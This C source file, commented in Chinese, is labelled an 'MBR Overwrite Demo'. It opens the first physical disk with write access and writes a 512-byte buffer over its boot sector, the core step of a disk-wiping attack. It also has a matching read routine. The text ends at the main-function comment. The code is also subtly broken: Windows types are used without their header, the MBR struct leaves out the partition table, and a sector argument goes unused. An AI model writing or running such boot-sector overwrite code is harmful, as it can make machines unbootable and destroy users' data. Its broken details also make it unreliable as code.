#include <stdio.h>
#include <stdlib.h>

// 定义MBR大小（512字节）
#define MBR_SIZE 512

// 定义MBR结构
typedef struct {
    char boot_code[446];      // 引导代码（446字节）
    unsigned short boot_signature; // 引导签名（0xAA55）
} MBR;

// 定义自定义引导信息
char custom_message[] = "MBR Overwrite Demo - Do Not Boot!\n";

// 写入MBR扇区
void WriteMBR(const char* buffer, DWORD sector) {
    HANDLE hDevice = CreateFileA("\\\\.\\PhysicalDrive0", 
                                GENERIC_READ | GENERIC_WRITE,
                                FILE_SHARE_READ | FILE_SHARE_WRITE,
                                NULL,
                                OPEN_EXISTING,
                                FILE_ATTRIBUTE_NORMAL,
                                NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("无法打开磁盘设备！\n");
        return;
    }

    DWORD bytesWritten;
    if (!WriteFile(hDevice, buffer, MBR_SIZE, &bytesWritten, NULL)) {
        printf("写入MBR失败！\n");
    }

    CloseHandle(hDevice);
}

// 读取MBR扇区
void ReadMBR(char* buffer) {
    HANDLE hDevice = CreateFileA("\\\\.\\PhysicalDrive0", 
                                GENERIC_READ,
                                FILE_SHARE_READ,
                                NULL,
                                OPEN_EXISTING,
                                FILE_ATTRIBUTE_NORMAL,
                                NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("无法打开磁盘设备！\n");
        return;
    }

    DWORD bytesRead;
    if (!ReadFile(hDevice, buffer, MBR_SIZE, &bytesRead, NULL)) {
        printf("读取MB，失败！\n");
    }

    CloseHandle(hDevice);
}

// 主函数
